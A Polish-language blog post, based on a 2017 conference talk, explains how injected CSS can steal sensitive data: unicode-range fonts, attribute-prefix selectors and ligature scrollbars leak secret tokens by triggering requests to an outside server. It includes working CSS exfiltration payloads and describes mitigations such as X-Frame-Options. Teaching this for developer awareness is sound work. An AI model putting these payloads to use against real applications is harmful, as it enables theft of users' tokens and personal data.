---
id: 856
index: 46
title: Hackowanie CSS
date: 2017-12-15T12:36:18.000Z
isMarkdown: false
status: publish
permalink: hackowanie-css
authors:
  - michal-miszczyszyn
guid: https://typeofweb.com/?p=856
type: post
thumbnail:
  url: >-
    https://typeofweb.com/wp-content/uploads/2017/11/mouse-trap-cheese-device-trap-633881.jpeg
  width: 887
  height: 400
categories:
  - slug: front-end
    name: Front-end
  - slug: back-end
    name: Back-end
seo: {}
---

Numerem 1 podatności aplikacji internetowych wg. OWASP jest szerokopojęte „Injection”. Zazwyczaj kiedy o tym mówimy gdzieś z tyłu głowy mamy wyłącznie JavaScript i tylko XSS. A to przecież błąd 😲 W tym wpisie pokażę Ci <strong>jak można wykorzystać ciekawe elementy języka CSS do kradzieży wrażliwych danych</strong> z aplikacji ofiary.

{/_ more _/}

<p class="important">Wpis powstał na podstawie mojej prezentacji z UnleashConf 2017 w Krakowie (występowałem z nią również na meet.js Gdańsk). <strong>Slajdy oraz kod znajdziesz na samym końcu wpisu, w podsumowaniu.</strong></p>

Zanim przejdziemy dalej, zadam Ci jedno pytanie. Zastanów się nad nim. <strong>Ile znasz osób, które piszą backend i jednocześnie dobrze znają CSS?</strong> Domyślam się, że niewiele. Właśnie. Dlaczego to ważne? W tym wpisie pokazuję w jaki sposób można atakować aplikacje internetowe bez konieczności znajdywania podatności typu XSS czy SQL Injection, co do których zazwyczaj świadomość programistów jest znacznie wyższa. Nie. Tutaj atakuję aplikację tylko przy użyciu CSS :)

<p class="important">Ten wpis ma charakter wyłącznie edukacyjny i służy zwiększaniu świadomości programistów w zakresie różnego rodzaju podatności aplikacji internetowych.</p>

<h2>Kilka założeń</h2>

Na początek kilka założeń. A konkretnie to jedno, ale bardzo śmiałe. Ponieważ będę tutaj prezentował <strong>głównie ciekawostki</strong> i typowe <em>Proof of Concept</em>, mogę sobie na nie pozwolić. Mianowicie: Zakładam, że już znalazłaś/eś podatność w aplikacji, która pozwoli Ci na wstrzyknięcie CSS. W tym wpisie nie będzie ani słowa o tym jak to można zrobić. Nie będzie ani słowa o szukaniu CSS Injection, wykorzystywaniu Path Traversal czy Man in the middle, które mogłyby się przydać.  Sorry!

<h2>font-face i unicode-range</h2>

Na pewno niejednokrotnie dodawałaś/eś do swojej strony bądź aplikacji niestandardowego fonta, prawda? Więc bez wątpienia nieobcy jest Ci <code>font-face</code>. Oto przykład, w którym importuję fonta o nazwie Roboto z pliku roboto.woff2:

<pre class="language-css"><code>/* latin */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  src: url(https://fonts.gstatic.com/…/roboto.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215;
}</code></pre>

Ale czy wiesz do czego służy ostatnia właściwość <code>unicode-range</code>? Pozwala ona na zadeklarowanie <strong>jakie znaki znajdują się w konkretnym pliku z fontem</strong>. I tak, przykładowo, wyobraź sobie, że <code>roboto.woff2</code> zawiera alfabet łaciński, a <code>roboto-ext.woff2</code> zawiera literki z „ogonkami” typu ą ę ć ź itd. W takiej sytuacji tworzymy dwie definicje <code>font-face</code> z różnymi <code>unicode-range</code>:

<pre class="&quot;language-css"><code>/* latin */
@font-face {
  …
  src: url(roboto.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215;
}

/* latin-ext */
@font-face {
  …
  src: url(roboto2.woff2) format('woff2');
  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
}</code></pre>

Jeśli kiedykolwiek używałaś/eś Google Fonts to (prawdopodobnie nawet o tym nie wiedząc) używałaś/eś <code>unicode-range</code>. Google dodaje to domyślnie do swoich fontów :)

<h3>Po co mi <code>unicode-range</code>?</h3>

Otóż w rezultacie przeglądarka rozpocznie pobieranie drugiego pliku (z „ogonkami”) tylko jeśli na stronie rzeczywiście zostały te ogonki użyte. Po co? Dla <strong>poprawy wydajności</strong>, zmniejszenia transferu i liczby zapytań. Ogólnie: Optymalizacja.

Realny przykład: Mamy stronę korporacji, która ma podstrony po arabsku, angielsku i polsku. Na podstronie arabskiej pobierze się tylko plik z arabskimi znaczkami, na angielskiej tylko łacińskie znaki, a na polskiej pobiorą się łacińskie oraz „ogonki”. Brzmi dobrze, prawda?

<h3>Podatność</h3>

A co się stanie jeśli zdefiniujemy po jednym <code>font-face</code> z osobnym URL fonta dla każdego znaku w alfabecie? Będzie to wyglądało jakoś tak:

<pre class="language-css"><code>@font-face{
    font-family: hackerfont;
    src: url(http://typeofweb.com/char/A);
    unicode-range:U+0041;
}
@font-face{
    font-family: hackerfont;
    src: url(http://typeofweb.com/char/B);
    unicode-range:U+0042;
}
@font-face{
    font-family: hackerfont;
    src: url(http://typeofweb.com/char/C);
    unicode-range:U+0043;
}
…</code></pre>

I tak dalej, dla każdej litery alfabetu. <strong>Następnie używamy tego fonta do ostylowania jednego konkretnego elementu na stronie ofiary i wstrzykujemy jej ten CSS.</strong> Efekt widoczny na zrzucie ekranu poniżej:

<figure id="attachment_857" align="aligncenter" width="1024">
  <a href="https://typeofweb.com/wp-content/uploads/2017/12/Screen-Shot-2017-12-14-at-6.35.40-PM.png"><img class="size-large wp-image-857" src="https://typeofweb.com/wp-content/uploads/2017/12/Screen-Shot-2017-12-14-at-6.35.40-PM-1024x690.png" alt="Dzięki unicode-range poznałeś wszystkie znaki w tokenie. W tym przypadku deadbeef01." width="1024" height="690" /></a>
  <figcaption>
    Dzięki unicode-range poznałaś/eś wszystkie znaki w tokenie. W tym przypadku deadbeef01.
  </figcaption>
</figure>

Rezultat? Poznałaś/eś właśnie wszystkie znaki użyte w konkretnym miejscu w aplikacji ofiary. Co mogłaś/eś wykraść? Przykładowo <strong>wszystkie znaki tokena</strong> — z GitHuba, Travisa lub, przykład na czasie, jakiejś giełdy BitCoinowej. <strong>Oczywiście nie znamy konkretnej kombinacji, ale bardzo mocno zawężyłaś/eś sobie zakres poszukiwań i łatwiej będzie Ci teraz przeprowadzić kolejny atak</strong> (bruteforce, albo może socjotechnika?)

<h3>Jak zapobiegać?</h3>

No, jeśli masz buga, która pozwala na wstrzykiwanie CSS to <em>po prostu</em> go napraw. A co jeśli Twoja aplikacja musi polegać na tym, że użytkownicy dodają do niej kod CSS (zdarza się!)? Cóż, masz kłopot! Problem ten został opisany i zgłoszony twórcom Google Chrome, którzy jednak uznali, że <strong>nie jest to bug, a raczej niefortunny efekt uboczny:</strong>

<blockquote>This does seem like an unfortunate side effect.

<footer><cite>Źródło: <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=543078">bugs.chromium.org/p/chromium/issues/detail?id=543078</a></cite></footer></blockquote>

<h2>Hacking przez selektory CSS</h2>

Jak dobrze znasz selektory CSS? Przykładowo, czy wiesz co robi selektor <code>#secret-token[value^=0]</code>? Wybiera on tylko elementy, których atrybut <code>value</code> <strong>zaczyna się od 0</strong>. Więc kolejny wektorem ataku przez CSS jest możliwość wykorzystania właśnie takich selektorów CSS do kradzieży danych z konta ofiary.

<h3>Atak przez selektor</h3>

Wystarczy, że wygenerujesz odpowiedni CSS na wzór tego:

<pre class="language-css"><code>#secret-token[value^=A] {
    background-image: url(http://typeofweb.com/token/A);
}
#secret-token[value^=B] {
    background-image: url(http://typeofweb.com/token/B);
}
#secret-token[value^=C] {
    background-image: url(http://typeofweb.com/token/C);
}
…</code></pre>

Znowu: Dla każdej litery alfabetu generujesz odpowiedni CSS. Jeśli token, który chcesz ukraść zaczyna się od litery A, wtedy Twój serwer zostanie o tym poinformowany. Masz już pierwszą literę, co możesz z tym dalej zrobić? <strong>Wygenerować nowy zestaw selektorów</strong> gdzie pierwszą literą jest <code>A</code>, a zgadywana jest druga litera:

<pre class="language-css"><code>#secret-token[value^=AA] {
    background-image: url(http://localhost:3001/token/A);
}
#secret-token[value^=AB] {
    background-image: url(http://localhost:3001/token/B);
}
#secret-token[value^=AC] {
    background-image: url(http://localhost:3001/token/C);
}
…</code></pre>

<strong>I tak dalej, i tak dalej, aż znajdziesz wszystkie znaki w tokenie.</strong>

Czy to oznacza jednak, że użytkownik będzie musiał sam, dobrowolnie, wiele razy odświeżać stronę i pozwoli się w ten sposób okraść? Wcale nie jest to konieczne, <strong>jeśli tylko aplikację można osadzić wewnątrz <code>&lt;iframe&gt;</code> — wtedy atak można w pełni zautomatyzować</strong>. Na filmiku poniżej możesz zobaczyć kradzież kolejnych znaków z prostego tokena <code>cielecina1</code>:

https://youtu.be/dX8J0LBMlCY

<h3>Jak zapobiegać?</h3>

No, jeśli masz buga, która pozwala na wstrzykiwanie CSS to po prostu go napraw… i tak dalej ;) Z bezpieczeństwa aplikacji możemy Cię też podszkolić: <a href="https://szkolenia.typeofweb.com/" target="_blank">zapisz się na szkolenie z security</a>. Mocno utrudnisz też sprawę jeśli <strong>nie zezwolisz aby Twoja aplikacja była osadzana wewnątrz <code>&lt;iframe&gt;</code></strong>. W dzisiejszych czasach można to zrobić dość łatwo, wystarczy tylko dodać jeden nagłówek do odpowiedzi z serwera: <code>X-Frame-Options: DENY</code>

<h2>Atak z wykorzystaniem ligatur</h2>

Wiesz co to jest ligatura? To czcionka (lub glif) w której zamiast dwóch sąsiadujących osobnych liter używa się nowego specjalnego znaku, który powstał z połączenia tych liter. Przykładowo, za wikipedią, możemy wymienić takie kombinacje liter i odpowiednie dla nich ligatury:

<a href="https://typeofweb.com/wp-content/uploads/2017/12/Ligatures.png"><img class="aligncenter size-full wp-image-862" src="https://typeofweb.com/wp-content/uploads/2017/12/Ligatures.png" alt="Popularne ligatury" width="555" height="514" /></a>

Dzięki nim tekst ma być bardziej czytelny i piękny :) <strong>Ja też używam na tym blogu specjalnych ligatur do formatowania kodu.</strong> Przykładowo: <code>=&gt;</code> zamiast <code>=</code> i <code>&gt;</code> albo <code>!==</code> zamiast <code>!</code> <code>=</code> <code>=</code>. Wykorzystuję do tego fonta <a href="https://github.com/tonsky/FiraCode">FiraCode</a>.

<h3>Podatność</h3>

Jak widzisz, w webdevelopmencie również istnieje możliwość używania ligatur. Co to <em>de facto</em> oznacza w kontekście hackowania? Oznacza to, że <strong>możesz wpływać na dowolne kombinacje znaków na stronie…</strong> a więc możesz zastosować trick podobny do tego z atrybutami, zgadywać kolejne symbole w tokenie, znak po znaku… Jest to nieco bardziej skomplikowane niż poprzednie przykłady, ale wykonalne! Co musisz zrobić?

<ul>
    <li>dynamicznie generuj fonta</li>
    <li>zdefiniuj, że wszystkie znaki mają wielkość 0px</li>
    <li>zdefiniuj, że konkretna ligatura ma wielkość 5000px</li>
</ul>

W efekcie wszystkie znaki na stronie przestają być widoczne (zupełnie nie ma na niej nic). Natomiast <strong>konkretna kombinacja znaków</strong> jest bardzo duża… Tak ogromna, że aż nie mieści się w oknie przeglądarki i powoduje, że <strong>pojawia się scrollbar</strong>… Oto trick :)

<ul>
    <li>załaduj stronę w iframe</li>
    <li>wstrzyknij CSS (dokładnie tak jak w poprzednim przykładzie)</li>
    <li>jeśli w iframie pojawi się scrollbar -&gt; trafiłaś/eś w kombinację znaków!</li>
</ul>

Ale co z tego, że pojawia się scrollbar, skąd będziesz o tym wiedział(a)? Otóż <strong>w przeglądarkach opartych o webkit scrollbarom można ustawić tło w postaci obrazka. </strong>Mamy trafienie, widoczny jest scrollbar, przeglądarka próbuje pobrać obrazek i otrzymujemy informację na naszym serwerze!

<pre class="language-css"><code>body::-webkit-scrollbar:horizontal {
  background: url(https://typeofweb.com/match);
}</code></pre>

Teraz wystarczy tylko to kilka razy powtórzyć :)

Jeszcze dokładniejszy opis przeprowadzenia tego ataku (wraz z kodem!) znajdziecie na stronie <a href="https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/#attachment_22102">sekurak.pl</a>. Na samym końcu wpisu jest też filmik prezentujący końcowy efekt.

<h2>Stosowanie ataków CSS do kodu JS</h2>

Często zdarza się, że w aplikacjach internetowych część kodu generowana jest po stronie serwera — czasem również kodu JS. Pracowałem nawet przy projekcie, gdzie po stronie serwera generowany był token dla użytkownika, a następnie był on renderowany do HTML w postaci prostego tagu <code>&lt;script&gt;</code>. <strong>Czy na taki kod JS również można zastosować powyższe ataki? Ależ tak!</strong>

Wystarczy, że dodasz do swojego CSS-a taki fragment kodu i wszystkie powyższe ataki staną się możliwe:

<pre class="language-css"><code>script {
  display: block;
}</code></pre>

Nie wierzysz?

https://youtu.be/rlWYb_b3qi0

<h2>Podsumowanie</h2>

Cały kod oraz moje slajdy znajdziecie w repozytorium: <a href="https://github.com/mmiszy/unleashconf-css-hacking-2017">https://github.com/mmiszy/unleashconf-css-hacking-2017</a>

Z tego wpisu warto zapamiętać kilka rzeczy:

<ul>
    <li><strong>wstrzykiwałem wyłącznie CSS</strong>. Nie musiałem szukać podatności XSS, SQLi, czy jakiejkolwiek innej, aby dobrać się do danych ofiary — wystarczył tylko CSS.</li>
    <li><strong>rzadko myślimy o zabezpieczaniu CSS-a</strong>. Praktycznie nigdy nie traktujemy go jako możliwego wektoru ataku — a jak się okazuje, to błąd!</li>
    <li><strong>sam CSS wystarczy, aby zrobić komuś krzywdę</strong> — kraść możemy przecież nie tylko tokeny, ale np. numer telefonu, PESEL, czy nazwisko panieńskie matki, albo podobne wrażliwe dane, które mogą się okazać przydatne przy przeprowadzaniu innych ataków</li>
    <li><strong>postaraj się pomyśleć nad tym jak ładujesz swój CSS</strong></li>
    <li><strong>nie pozwalaj na ładowanie aplikacji wewnątrz <code>iframe</code></strong> — wystarczy jeden nagłówek</li>
</ul>

A Ty co sądzisz o tego typu atakach? A może znasz jakieś inne nietypowe zagrożenia związane z CSS? Napisz o tym w komentarzu!
